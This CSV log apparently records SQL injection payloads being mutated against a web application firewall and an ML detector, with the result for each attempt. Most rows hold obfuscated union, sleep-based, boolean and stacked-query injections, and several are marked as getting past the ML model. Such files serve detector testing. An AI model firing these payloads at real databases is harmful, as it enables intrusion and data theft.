Timestamp,Payload,WAF_Prediction_Timestamp,WAF_Prediction,ML_Prediction_Timestamp,ML_Prediction
2024-09-03T11:48:52.946068,"(seLECT/*|f}\*/ oR '9'<>' OR 0}')"""")/**/wheRE/**/0x26ea LikE (SeleCT (sELEct 1))<>(seLEct /**/||  and '
('='
(' In/**/((SELECT 934),0x3a7, || 1871 lIKe 1871)) AND
 anD 1/**/not like (sElECT 'w'='w' Like 7528)=(SeLeCt/*5Srh-*/4763)/**/not like 0x1741 LIKE 0x1741#(SElEcT   AnD  (seLecT 1))},+pC&VS3",2024-09-03T11:48:52.955732,403,2024-09-03T11:49:09.798507,Accepted
2024-09-03T11:49:10.809048,"-7347"""")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",2024-09-03T11:49:10.814709,403,2024-09-03T11:49:14.212435,Rejected
2024-09-03T11:49:14.222057,"-7347""""))/**/union all seLecT
4360,0x1108,4360,4360, || 1510!=1511,4360,4360,4360,4360#u",2024-09-03T11:49:14.227572,403,2024-09-03T11:49:18.613934,Rejected
2024-09-03T11:49:19.627823,"-7347""""))/**/union all SElEct	4360,0x1108,6898 In (6897,6898,6899), AND/**/1, || 0x5e6!=1511,4360,4360,4360,4360#uk",2024-09-03T11:49:19.632412,403,2024-09-03T11:49:25.068883,Rejected
2024-09-03T11:49:26.089004,"-(SELECT 1)""""))/**/union all seLeCT
4360,0x1108,(SELECT 6898) iN/**/(6897,6898,6899), AnD/*Lh}@*/1, || 0x5e6<>1511,2272 IN (2271,2272,2273),4360,4360,4360#uk",2024-09-03T11:49:26.092197,403,2024-09-03T11:49:33.092878,Rejected
2024-09-03T11:49:34.113974,"-(sElEct 1)""""))/**/union all SELECT 4360,0x1108,(selEcT (SELECT 6898)) iN/**/((SELECT 1),6898,6899), ANd/*M6el*/1, /**/oR  0x5e6<>1511,2272 in (2271,2272,2273),7747 IN (7746,7747,7748),4360,4360#uk",2024-09-03T11:49:34.120605,403,2024-09-03T11:49:42.540811,Rejected
2024-09-03T11:49:43.557726,"-(seLecT 1)""""))/**/union all sElecT/**/4360,0x1108,(seleCt (SEleCt 6898)) In/**/((SelECt  Or 0),0x1af2,6899), and/*M6el*/1, /**/OR 	0x5e6<>1511,2272 In (2271,2272,2273),'&' not like '&|' iN (7746,7747,7748),4360,4360#ukCg",2024-09-03T11:49:43.561661,403,2024-09-03T11:49:53.328442,Rejected
2024-09-03T11:49:54.359382,"-(sELECT  AND 1)""""))/*""o$*/union all sElect/**/4360,0x1108,(seLECT (sElECT 6898)) IN/**/((selEct  OR 0),0x1af2,6899), ANd/*M6el*/1,  OR 
0x5e6<>8242<>8243,2272 IN (2271,2272,2273),'&' not like '&|' In (0x1e42,7747,7748),4360,4360#ukCg",2024-09-03T11:49:54.366314,403,2024-09-03T11:50:05.124155,Rejected
2024-09-03T11:50:06.155982,"-(SElecT  AnD 1)""""))/*""o$*/union/**/all sElEct/**/4360,0x1108,(SELect (SeLect 6898)) In/**/((SeLecT  or 0),0x1af2,6899), aND/*M6el*/1,  or  0x5e6<>8242 NOT LIKE 'uN$'!='uN$J',2272 IN (2271,0x8e0,2273),'&' not like '&|' IN (0x1e42,7747,7748),4360, OR 0#ukCgX",2024-09-03T11:50:06.173955,403,2024-09-03T11:50:17.240322,Rejected
2024-09-03T11:50:18.272523,"-(seLecT /**/ANd 1)""""))/*""o$*/union/*.q.Pq*/all sElECT/**/4360,0x1108,(seleCT (SeLECT 6898)) In/**/((seleCt  Or 0),0x1af2,6899),	ANd/*M6el*/1,  or  0x5e6<>8242 not like 'uN$'!='uN$J',2272 iN (2271,0x8e0,(SELECT 9819)!=9820),'&' not like '&|' IN (0x1e42,7747,7748), AND 1, oR 0#ukCgX",2024-09-03T11:50:18.282353,403,2024-09-03T11:50:30.301803,Rejected
2024-09-03T11:50:31.331976,"-(SeLeCt /**/anD 1)""""))/*""o$*/union/*.q.Pq*/all sEleCt/**/4360,0x1108,(sElECt (SELECT 6898)) in/**/((SELEcT  or 0),0x1af2,6899), anD/*M6el*/ OR 0,  oR  0x5e6<>8242 not like 'uN$'!='uN$J',7355 NOT LIKE 7356 in ((sEleCT 2271),0x8e0,(SELect 9819)!=9820),'&' not like '&|'/**/in (0x1e42,7747,7748), ANd 1, oR 0#ukCgXpA",2024-09-03T11:50:31.346111,403,2024-09-03T11:50:45.229451,Accepted
2024-09-03T11:50:46.248604,"-(SeLect /**/AND 1)""""))/**/union/*.q.Pq*/all seLECt/**/4360,0x1108,(seleCT (sEleCt (SELECT 1))) iN/*`}|EW*/((SElecT  oR 0),0x1af2,6899), aND/*M6el*/ OR 0,	 oR  0x5e6!=8242 not like 'uN$'!='uN$J',7355 NOT LIKE/**/7356 In ((sElECT 2271),0x8e0,(SeLect 9819)!=0x265c),'&' not like '&|'/**/IN (0x1e42,7747,7748), aNd 1, OR 'S' NOT LIKE 'Sl'#ukCgXpA",2024-09-03T11:50:46.253171,403,2024-09-03T11:51:00.500020,Accepted
2024-09-03T11:51:01.525487,1' where 7191=7191 rlike sleep(5)--,2024-09-03T11:51:01.532797,403,2024-09-03T11:51:03.457086,Rejected
2024-09-03T11:51:03.475362,(SeLect 1)' wHERE 7191 LikE 7191 rlike/**/sleep(9442	NOT LIKE (sELeCT 1))--,2024-09-03T11:51:03.479132,403,2024-09-03T11:51:07.481604,Rejected
2024-09-03T11:51:08.494487,(SeLECT 0x1)' wHeRe 7503 NOT LIKE 7504 like/**/7191 rlike/**/sleep((selECT 1) not like (seLEct 1))--,2024-09-03T11:51:08.498693,403,2024-09-03T11:51:12.774443,Rejected
2024-09-03T11:51:13.796767,"(sElecT 0x1)'/**/wHeRe
7503 NOT LIKE 'l' LIKE 'l' lIKe/**/7191 rlike/**/sleep((SEleCT (SELECT 1)) not like (Select  AND 1))--",2024-09-03T11:51:13.800150,403,2024-09-03T11:51:19.213421,Rejected
2024-09-03T11:51:20.249284,(selECT 0x1)'/**/wHeRe	7503 NOT LIKE 'l' LIKE 'l' lIKe 2405 LIKE (SELECT  AND 1) rlike/**/sleep((sELECT (SElEcT 1)) not like (selEct  AnD 1))--,2024-09-03T11:51:20.265000,403,2024-09-03T11:51:26.405983,Rejected
2024-09-03T11:51:27.437936,"(selecT 0x1)'/*>PvG*/wHeRe
7503 NOT LIKE 'l' LIKE 'l' LiKE 2405 LiKE (selecT  AND  OR 0=5251) rlike/**/sleep((SElECT (sEleCT 1))/**/not like (sElect  ANd 0x1))--",2024-09-03T11:51:27.442402,403,2024-09-03T11:51:35.382678,Rejected
2024-09-03T11:51:36.399909,"(sElEct 0x1)'/*>PvG*/wHeRe
 OR 0 LIKE 7034 NOT LIKE 'l' LIKE 'l' Like 2405 LiKE (SeLEcT  AnD 	OR 0=5251) rlike/**/sleep((SelEcT (Select (SELECT 1))) not like (SEleCt  aNd 0x1))--",2024-09-03T11:51:36.403690,403,2024-09-03T11:51:45.716602,Rejected
2024-09-03T11:51:46.740910,(SeleCt 0x1)' wHeRe	 OR 0 LIKE 7034 NOT LIKE 'l' LIKE 'l' LiKe 2405 like (sEleCT  And 	Or (SELECT (SELECT 1)) LIKE 5251) rlike/*QZ= */sleep((SeLeCt (seLeCt (sELECt ']RZ' LIKE ']RZ'))) not like (sElecT  and 0x1))--,2024-09-03T11:51:46.791583,403,2024-09-03T11:51:57.391293,Rejected
2024-09-03T11:51:58.435927,"(SELecT 0x1)' wHeRe	 OR 0x0 LIKE 7034 NOT LIKE 'l' LIKE 'l' LiKe 2405 like (sEleCT  And 	Or (SELECT (SELECT ' LIKe BfX'<>'=BfX''))
LikE 5251) rlike/*D$ OR 0+%*/sleep((SeleCt (seleCT (SeLecT ']RZ' Like/**/']RZ'))) not like (SeLECt  aND 0x1))--",2024-09-03T11:51:58.439503,403,2024-09-03T11:52:08.616867,Rejected
2024-09-03T11:52:09.641508,"(sELeCt 0x1)' wHeRe	 OR 0x0 LIKE 0x1b7a NOT LIKE 'l' LIKE 'l' LiKe (SELECT 1) like (sEleCT 
And 	Or (SELECT (SELECT ' LiKE BfX'<>' like BfX''))
LikE 'Q'='Q') rlike/*k$c>}*/sleep((seLecT (SelECT (SeLecT ']RZ' liKe ']RZ'))) not like (SelEcT  ANd 0x1))--",2024-09-03T11:52:09.645257,403,2024-09-03T11:52:20.725322,Rejected
2024-09-03T11:52:21.752409,"(SeLect 0x1)' wHeRe	 OR 0x0 LIKE 0x1b7a NOT LIKE 'l' LIKE 'l' LiKe (SELECT  OR 'Lx'!='Lx&') like (sEleCT 
And 	Or (SELECT (SELECT ' likE BfX'<>' LiKe BfX''))
lIkE 'Q' like 'Q') rlike sleep((selEct (SelECt (seLecT ']RZ'
likE ']RZ'))) not like (SeLeCT  aNd 0x1))--",2024-09-03T11:52:21.756687,403,2024-09-03T11:52:33.159121,Rejected
2024-09-03T11:52:34.168687,-3938%'))) or 2034=7209#,2024-09-03T11:52:34.172462,403,2024-09-03T11:52:35.266403,Rejected
2024-09-03T11:52:35.277045,-3938%')))/**/or	'}h' NOT LIKE '}h`' LIKE (SELECT 0x1)##m,2024-09-03T11:52:35.281075,403,2024-09-03T11:52:37.745406,Rejected
2024-09-03T11:52:38.764092,-0xf62%')))/**/or	'}h'/*|*/NOT LIKE	'}h`' LIkE (sElect 0x1)##m,2024-09-03T11:52:38.769433,403,2024-09-03T11:52:42.232986,Rejected
2024-09-03T11:52:43.247630,-0xf62%')))/**/or	'}h'/*|*/NOT	LIKE	'}h`'/**/LIkE (sElect 0x1)##mh',2024-09-03T11:52:43.253443,403,2024-09-03T11:52:46.502633,Accepted
2024-09-03T11:52:47.518200,"-0xf62%')))/**/or	'}h'/*|*/NOT	LIKE	'}h`' LIkE (sElect
0x1)##mh'zr",2024-09-03T11:52:47.524444,403,2024-09-03T11:52:50.372291,Rejected
2024-09-03T11:52:51.397896,"-0xf62%'))) or	'}h'/*|*/NOT	LIKE	'}h`' LIkE	(sElect
0x1)##mh'zr",2024-09-03T11:52:51.401320,403,2024-09-03T11:52:54.300348,Rejected
2024-09-03T11:52:55.315241,"-0xf62%')))/*s{X,""*/or	'}h'/*|*/NOT LIKE	'}h`' LIkE	(sElect
0x1)##mh'zr",2024-09-03T11:52:55.318836,403,2024-09-03T11:52:58.423329,Accepted
2024-09-03T11:52:59.438520,"-0xf62%')))/**/or	'}h'/*|*/NOT
LIKE	'}h`'/**/LIkE	(sElect
0x1)##mh'zr`R",2024-09-03T11:52:59.444981,403,2024-09-03T11:53:02.540309,Accepted
2024-09-03T11:53:03.548718,"-0xf62%')))/**/or	'}h'/*|*/NOT
LIKE	'}h`'/*#T@*/LIkE/**/(sElect
0x1)##mh'zr`R",2024-09-03T11:53:03.551769,403,2024-09-03T11:53:06.978653,Accepted
2024-09-03T11:53:07.989368,"-0xf62%')))/**/or	'}h'/*|*/NOT
LIKE/**/'}h`'/*#T@*/LIkE/*C */(sElect
0x1)##mh'zr`R",2024-09-03T11:53:07.992794,403,2024-09-03T11:53:11.921945,Accepted
2024-09-03T11:53:12.933828,"-0xf62%')))/**/or '}h'/*|*/NOT
LIKE '}h`'/*#T@*/LIkE/**/(sElect
0x1)##mh'zr`RY",2024-09-03T11:53:12.938954,403,2024-09-03T11:53:16.414308,Accepted
2024-09-03T11:53:17.426619,1') or (select * from (select(sleep(5)))ydpu) and ('zaes'='zaes,2024-09-03T11:53:17.431399,403,2024-09-03T11:53:20.441180,Rejected
2024-09-03T11:53:20.451134,"(SELECT 7859 IN (7858,7859,7860))') or (select * from	(select(sleep(0x5)))ydpu)/**/and ('zaes'='zaes",2024-09-03T11:53:20.455880,403,2024-09-03T11:53:26.265832,Rejected
2024-09-03T11:53:27.282671,"(SElECT  Or/**/0 IN (7858,'e[R' not like 'e[RX',(SELECT 7860)))') or (select * from	(select(sleep(0x5)))ydpu)/**/and	('zaes'='zaes",2024-09-03T11:53:27.288704,403,2024-09-03T11:53:33.699133,Rejected
2024-09-03T11:53:34.713072,"(sEleCt	 oR/**/ or 4775!=4776 in (7858,'e[R' not/**/LIkE 'e[RX',(SELECt 0x1eb4)))') or (select * from	(select(sleep(0x5)))ydpu)/*[OF/-*/and	('zaes'='zaes",2024-09-03T11:53:34.717224,403,2024-09-03T11:53:43.251869,Rejected
2024-09-03T11:53:44.270604,"(SELeCt	 ||/*17B#d*/
Or (SEleCT 4775)!= oR 0 In/**/(7427<>7428,'e[R' not/**/like 'e[RX',(sELEct 0x1eb4)))') or (select * from	(select(sleep(0x5)))ydpu)/*[OF/-*/and	('zaes'='zaes",2024-09-03T11:53:44.274077,403,2024-09-03T11:53:52.978419,Rejected
2024-09-03T11:53:53.994373,"(seLECt	 ||/**/
or (selECT
4775)!= or/**/0 IN/**/(2867!=2868<> or 0,'e[R' not/*~(SELECT 11)*/likE 'e[RX',(SeLECt 0x1eb4)))') or (select * from	(select(sleep(0x5)))ydpu)/*[OF/-*/and	('zaes'='zaes",2024-09-03T11:53:54.000353,403,2024-09-03T11:54:04.420498,Rejected
2024-09-03T11:54:05.434075,"(SeleCt	 ||/**/
or (SELecT
7796 NOT LIKE 7797) NOT LIKE  OR/*z*/ AND 1 IN/**/(2867!=(SelEcT 2868)<> oR 0,'e[R' not/*~(SELECT 11)*/LIKe 'e[RX',(SelECt 0x1eb4)))') or (select/**/* from (select(sleep(0x5)))ydpu)/*[OF/-*/and	('zaes'='zaes",2024-09-03T11:54:05.439008,403,2024-09-03T11:54:16.452601,Rejected
2024-09-03T11:54:17.477167,"(SeLEcT
 ||/**/
Or (seleCT
7796 NOT LIKE 7797) NOT LIKE  OR/*z*/ And 7041 NOT LIKE 7042 IN (0xb33!=(seleCt 2868)<> OR (SELECT 1),'e[R' not/*~(SELECT 11)*/LIkE 'e[RX',(sELeCT 0x1eb4)))') or (select/*zIW*/* from (select(sleep(0x5)))ydpu)/*[OF/-*/and	('zaes'='zaes",2024-09-03T11:54:17.483473,403,2024-09-03T11:54:29.094627,Rejected
2024-09-03T11:54:30.110483,"(SeLeCT
 || 
oR (SElECT
7796 NOT LIKE 0x1e75) NOT LIKE  Or/* *2=*/ AND 7041 NOT LIKE 7042 In (0xb33!=(SELEct
2868) NOT LIKE  or (SELECT  Or 0 NOT LIKE 1884),'e[R' not/*~(SELECT 11)*/LikE 'e[RX',(SeLecT 0x1eb4)))') or (select/**/* from (select(sleep(0x5)))ydpu)/*[OF/-*/and	('zaes'='zaes",2024-09-03T11:54:30.115031,403,2024-09-03T11:54:43.012840,Rejected
2024-09-03T11:54:44.026261,"(SELeCt	 || 
oR (SelEct
7796 NOT LIKE 0x1e75) NOT LIKE  OR/* *6049=6049=*/ AnD 7041 not like 7042 In (0xb33!=(SElecT
(SELECT 1)) NOT LIKE  or (SeleCT  Or 0 NOT LIKE 1884),'e[R' not/*~(SELECT 0xb)*/LikE 'e[RX',(SelECT 0x1eb4)))') or (select * from (select(sleep(0x5)))ydpu)/*[OF/-*/and	('zaes'='zaes",2024-09-03T11:54:44.031873,403,2024-09-03T11:54:57.718151,Rejected
2024-09-03T11:54:58.748553,"(SElEcT	  OR /*tN*/
Or (SELEcT
7796 NOT LIKE 0x1e75) NOT LIKE  Or/* *4586=4586=6049=*/ anD  And 1 not like 0x1b82 iN (0xb33!=(seleCT
(SelECt 1)) NOT LIKE  oR (SELeCT  Or 0 NOT LIKE 1884),'e[R' not/*~(SELECT 0xb)*/lIkE 'e[RX',(sElECt 0x1eb4)))') or (select * from (select(sleep(0x5)))ydpu)/*[OF/-*/and
('zaes'='zaes",2024-09-03T11:54:58.753182,403,2024-09-03T11:55:12.232907,Rejected
2024-09-03T11:55:13.245007,"-9356 or elt(1032=1032,3623)-- izgi",2024-09-03T11:55:13.248771,403,2024-09-03T11:55:16.442968,Rejected
2024-09-03T11:55:16.452856,"-(SELECT 9356) OR elt((SelECT	1)/**/LIKE '/~'!='/~v',3623)-- izgi",2024-09-03T11:55:16.456333,403,2024-09-03T11:55:19.657541,Rejected
2024-09-03T11:55:20.676043,"-(sElect (SELECT 1)) Or elt((seLeCt	0x1) like '/~' not	like '/~v',8063<>8064)-- izgi",2024-09-03T11:55:20.680710,403,2024-09-03T11:55:24.448485,Rejected
2024-09-03T11:55:25.462225,"-(SelecT (SElEct (SELECT 7249!=7250))) or elt((SeLECT	0x1) lIKE '/~'
not	like/*)t*/'/~v',8063<>0x1f80)-- izgi",2024-09-03T11:55:25.465744,403,2024-09-03T11:55:30.521434,Rejected
2024-09-03T11:55:31.545510,"-(selEct (SELECt/*u1ipU*/(selEcT  anD 1!=0x1c52))) oR elt((SElEcT	0x1)
LiKe '/~'
not	like/*)t*/'/~v','3PY'='3PY'!=0x1f80)-- izgi",2024-09-03T11:55:31.561426,403,2024-09-03T11:55:36.993106,Accepted
2024-09-03T11:55:38.009573,"-(SeLECt/**/(SELECT/**/(seleCt  and  OR 0<>0x1a09!=0x1c52))) or elt((sElecT	0x1) liKe '/~'
not	like/*)t*/'/~v','3PY' liKe '3PY'!=0x1f80)-- izgi",2024-09-03T11:55:38.014642,403,2024-09-03T11:55:45.856131,Accepted
2024-09-03T11:55:46.881679,"-(SElECT/**/(sElecT/**/(SElect  AND  OR  anD 0x1<>0x1a09!=0x1c52)))
oR/**/elt((sElEcT	0x1) LIke '/~'
not	like/*)t*/'/~v','3PY' LIKe '3PY'!=0x1f80)-- izgiUy",2024-09-03T11:55:46.887243,403,2024-09-03T11:55:53.538532,Accepted
2024-09-03T11:55:54.567789,"-(SELECT/**/(SelEct/**/(SElECT  &&  or/**/ and 0x1<>0x1a09!=0x1c52))) or/*\*/elt((selecT	0x1) lIKE '/~'
not	like/*)t*/'/~v','3PY' lIkE '3PY'!=0x1f80)-- izgiUy",2024-09-03T11:55:54.574204,403,2024-09-03T11:56:02.188480,Accepted
2024-09-03T11:56:03.217213,"-(SElecT/*Sfou*/(SeleCt/**/(sElECt   aNd   Or/**//**/AND 0x1<>0x1a09!=0x1c52))) or/*\*/elt((sElEct	0x1) LIke '/~' not	like/*)t*/'/~v','3PY' liKE '3PY'!=0x1f80)-- izgiUy",2024-09-03T11:56:03.223617,403,2024-09-03T11:56:14.004105,Accepted
2024-09-03T11:56:15.025249,"-(SElecT/*Sfou*/(seleCt/**/(SElect   aNd
  Or/*~0x1`P*//**/And 0x1<>0x1a09 NOT LIKE 0x1c52))) Or/*\*/elt((SElect	0x1) Like '/~'/**/not	like/*)t*/'/~v','3PY' LIKe '3PY'!=0x1f80)-- izgiUy",2024-09-03T11:56:15.030819,403,2024-09-03T11:56:24.285609,Accepted
2024-09-03T11:56:25.305654,"-(sELecT/*Sfou*/(SeLeCt/**/(sElECt   AnD
  OR/**//*AE_?*/ANd/**/0x1 not like 0x1a09 NOT LIKE 0x1c52))) Or/*\*/elt((SElecT 0x1) lIKE '/~'/**/not	like/*)t*/'/~v','3PY' liKE '3PY'!=0x1f80)-- izgiUy",2024-09-03T11:56:25.311497,403,2024-09-03T11:56:34.629600,Accepted
2024-09-03T11:56:35.641530,"1' in boolean mode);select count(*) from generate_series(1,5000000)#",2024-09-03T11:56:35.658914,403,2024-09-03T11:56:38.605833,Rejected
2024-09-03T11:56:38.615683,"'('!='(4'' In boolean mode);SeLEcT count(*) FROM/**/generate_series(
aND 1,(SeLeCT 5000000))#!",2024-09-03T11:56:38.621641,403,2024-09-03T11:56:43.700197,Rejected
2024-09-03T11:56:44.711967,"'(' not like '(4'' In boolean mode);SeLEcT count(*) FROM	generate_series(
aND  AND 'ou#'='ou#',(selEct (SeleCT 5000000)))#!",2024-09-03T11:56:44.714781,403,2024-09-03T11:56:50.227716,Rejected
2024-09-03T11:56:51.247478,"'(' not/**/LIkE '( AND 0x1'' In boolean mode);SeLEcT count(*) FROM	generate_series( aND  AND 'ou#'='ou#',(SElEcT (sELecT 8202!=8203)))#!OL",2024-09-03T11:56:51.252114,403,2024-09-03T11:56:58.077316,Rejected
2024-09-03T11:56:59.097415,"'(' not LIKe '( AND 0x1'' In boolean mode);SeLEcT count(*) FROM
generate_series( aND  AND 'ou#'='ou#',(SelEcT (seLECT 0x200a not like  Or '	w' NOT LIKE '	w@')))#!OL",2024-09-03T11:56:59.101035,403,2024-09-03T11:57:07.525893,Rejected
2024-09-03T11:57:08.538498,"'(' not LIKe '( AND 0x1'' In boolean mode);SeLEcT count(*) FROM
generate_series( aND/**/ AND '_I' LIKE '_I',(SelEcT (seLECT 0x200a not like  Or '
w' NOT LIKE '	w@')))#!OL",2024-09-03T11:57:08.544948,403,2024-09-03T11:57:17.078905,Rejected
2024-09-03T11:57:18.089101,"'(' not LIKe '( AND 0x1'' In boolean mode);SeLEcT/**/count(*) FROM
generate_series( aND/*x*/ AND '_I' LIKE '_I',(SelEcT (seLECT 0x200a
not like  Or '
w' NOT LIKE '	w@')))#!OL",2024-09-03T11:57:18.094949,403,2024-09-03T11:57:26.805417,Rejected
2024-09-03T11:57:27.823429,"'(' not LIKe '( AND 0x1'' In boolean mode);SeLEcT count(*) FROM
generate_series( aND/*Q|*/	AND '_I' LIKE '_I',(SelEcT (seLECT 0x200a
not like  Or '
w' NOT LIKE '	w@')))#!OL",2024-09-03T11:57:27.827461,403,2024-09-03T11:57:36.538355,Rejected
2024-09-03T11:57:37.554288,"'(' not LIKe '( AND 0x1'' In boolean mode);SeLEcT count(*) FROM
generate_series( aND/*Q|*/	AND '_I' LIKE '_I',(SelEcT (seLECT/**/0x200a
not like  Or '
w' NOT LIKE ' w@')))#!OLA",2024-09-03T11:57:37.557881,403,2024-09-03T11:57:46.581288,Rejected
2024-09-03T11:57:47.608628,"'('/**/not LIKe '( AND 0x1'' In boolean mode);SeLEcT count(*) FROM
generate_series( aND/*Q|*/	AND '_I'
LIKE '_I',(SelEcT (seLECT/*($k*/0x200a
not like  Or '
w' NOT LIKE ' w@')))#!OLA",2024-09-03T11:57:47.616221,403,2024-09-03T11:57:57.653678,Rejected
2024-09-03T11:57:58.669058,"'('/**/not LIKe '( AND 0x1'' In boolean mode);SeLEcT count(*) FROM
generate_series(
aND/*Q|*/	AND '_I'
LIKE '_I',(SelEcT (seLECT/*($k*/0x200a
not like  Or '
w' NOT LIKE/**/' w@')))#!OLAq",2024-09-03T11:57:58.673211,403,2024-09-03T11:58:07.879933,Rejected
2024-09-03T11:58:08.892519,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:08.909270,200,2024-09-03T11:58:10.412345,Accepted
2024-09-03T11:58:10.421667,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:10.427135,200,2024-09-03T11:58:12.023237,Accepted
2024-09-03T11:58:13.032481,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:13.036555,200,2024-09-03T11:58:14.506564,Accepted
2024-09-03T11:58:15.519790,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:15.525561,200,2024-09-03T11:58:16.945716,Accepted
2024-09-03T11:58:17.964842,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:17.971039,200,2024-09-03T11:58:19.347485,Accepted
2024-09-03T11:58:20.360017,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:20.366313,200,2024-09-03T11:58:21.758020,Accepted
2024-09-03T11:58:22.773435,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:22.786025,200,2024-09-03T11:58:24.488173,Accepted
2024-09-03T11:58:25.504108,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:25.510071,200,2024-09-03T11:58:27.047963,Accepted
2024-09-03T11:58:28.062345,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:28.069590,200,2024-09-03T11:58:29.554982,Accepted
2024-09-03T11:58:30.569584,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:30.579191,200,2024-09-03T11:58:31.950071,Accepted
2024-09-03T11:58:32.957180,livermore-kozlowski@hiteurope.ws,2024-09-03T11:58:32.961067,200,2024-09-03T11:58:34.413782,Accepted
2024-09-03T11:58:35.427345,"1""""))) and 7533=7533 and (((""""alvd"""" like """"alvd",2024-09-03T11:58:35.436589,200,2024-09-03T11:58:37.970174,Rejected
2024-09-03T11:58:37.981051,"'!'<>'!y'""""))) ANd
 OR 0 LIKE (SELECT 7533)/**/ANd (((""""alvd"""" likE """"alvd",2024-09-03T11:58:37.984368,403,2024-09-03T11:58:41.727012,Rejected
2024-09-03T11:58:42.750034,"'!'<>'!y'""""))) aNd  oR (sELEct '.5' NOT LIKE '.(SELECT 1)*') LiKE (seLEcT 7533) aNd (((""""alvd"""" lIkE """"alvd",2024-09-03T11:58:42.754891,403,2024-09-03T11:58:47.367044,Rejected
2024-09-03T11:58:48.385516,"'!'!='!y'""""))) and /**/OR (selEcT '.7988 IN (7987,7988,(SELECT 1))' NOT LIKE '.(SELECT	(SELECT 1))*') lIKE (Select 7533) and (((""""alvd"""" lIKE """"alvd",2024-09-03T11:58:48.388983,403,2024-09-03T11:58:54.891946,Rejected
2024-09-03T11:58:55.906349,"'!' not like '!y'""""))) And  oR (sEleCt '.7988 IN (7987, OR 0,(SELECT 0x1))' NOT LIKE '.(SELECT
(SELECT 'F'='F'))*') LIkE (SElEcT 7533) and (((""""alvd"""" LIKe """"alvd",2024-09-03T11:58:55.911671,403,2024-09-03T11:59:04.074576,Rejected
2024-09-03T11:59:05.105525,"'!' not
like '!y'""""))) AND  oR (sELeCt/*b3va*/'.6605 IN (6604,6605,6606) IN (7987, OR 0,(SELECT 0x1))' not like '.(SELECT
(SELECT 'F'='F'))*') LIkE (SElEcT (seLEcT (seleCT 1))) AND (((""""alvd"""" lIKE """"alvd",2024-09-03T11:59:05.108757,403,2024-09-03T11:59:14.855331,Rejected
2024-09-03T11:59:15.868808,"'!' not like '!y'""""))) and  or (SelECT/*NH3$*/'.6605 IN ((SELECT 1),6605,6606) IN (')	zL'<>')	zLn', OR 0,(SELECT 0x1))' not like '.(SELECT
(SELECT 'F'='F'))*') LIKe/**/(sELecT (selecT (SeleCt 0x1))) and (((""""alvd"""" likE """"alvd",2024-09-03T11:59:15.873625,403,2024-09-03T11:59:27.352488,Rejected
2024-09-03T11:59:28.372370,"'!' not like '!y'""""))) And  or (SELECT '.6605 IN ((SELECT 1),(SELECT 6605),(SELECT '""Od' LIKE '""Od')) IN (')	zL'<>')	zLn', OR 0,(SELECT 0x1))' not like '.(SELECT (SELECT 'F'='F'))*') lIKe/*1.I*/(selecT (sELecT (SelEcT 0x1))) anD (((""""alvd"""" likE """"alvd",2024-09-03T11:59:28.377178,403,2024-09-03T11:59:40.600483,Rejected
2024-09-03T11:59:41.627384,"'!' not like '!y'""""))) &&  OR (SelecT '.6605 IN ((SELECT 0x1),(SELECT 9950 IN (9949,(SELECT 1),9951)),(SELECT '""Od' LIKE '""Od')) IN (') zL'<>')	zLn', OR 0,(SELECT 0x1))' not like '.(SELECT (SELECT 'F'='F'))*') LIke (Select (seleCT (seLect 0x1))) anD (((""""alvd"""" LIKe """"alvd",2024-09-03T11:59:41.632050,403,2024-09-03T11:59:55.206819,Rejected
2024-09-03T11:59:56.248240,"'!' not like '!y'"""")))  ANd   oR (select '.6605 IN ((SELECT 0x1),(SELECT 9950 IN (9949,(SELECT 'lDb'='lDb'),9951)),(SELECT '""Od' LIKE '""Od')) IN (') zL'<>')	zLn', OR (SELECT  OR 0),(SELECT	0x1))' not like '.(SELECT (SELECT 'F'='F'))*') LIkE (SelEcT (sELect (SelEct 0x1))) and (((""""alvd""""/**/LiKe """"alvd",2024-09-03T11:59:56.252987,403,2024-09-03T12:01:39.011089,Rejected
2024-09-03T12:37:11.926917,"-7347"""")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",2024-09-03T12:37:11.934206,403,2024-09-03T12:37:17.171193,Rejected
